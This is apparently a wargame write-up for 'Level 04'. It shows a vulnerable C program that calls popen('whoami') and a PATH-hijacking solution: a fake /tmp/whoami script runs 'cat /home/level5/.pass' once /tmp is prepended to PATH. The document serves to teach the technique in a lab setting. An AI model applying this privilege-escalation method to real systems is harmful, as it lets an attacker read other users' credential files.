# Level 04

The code is as follows:

```
int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f); 
        printf("Welcome %s", username);

        return 0;
}
```

It's important to note that `popen` works by creating a new shell.  In this case
it will execute `/bin/sh -c "whoami".

We *know* that the `sh` command will obey anything defined in our `${PATH}` variable.

## Create a fake `whoami`

Create a file in `/tmp/whoami` that looks like this...

```
#!/bin/bash
cat /home/level5/.pass
```

## Modify the `${PATH}`

Change the `${PATH}` to be...

```
export PATH=/tmp:${PATH}
```

## Done...

When you run the program, it will find our fake `whoami` program first and 
execute it.
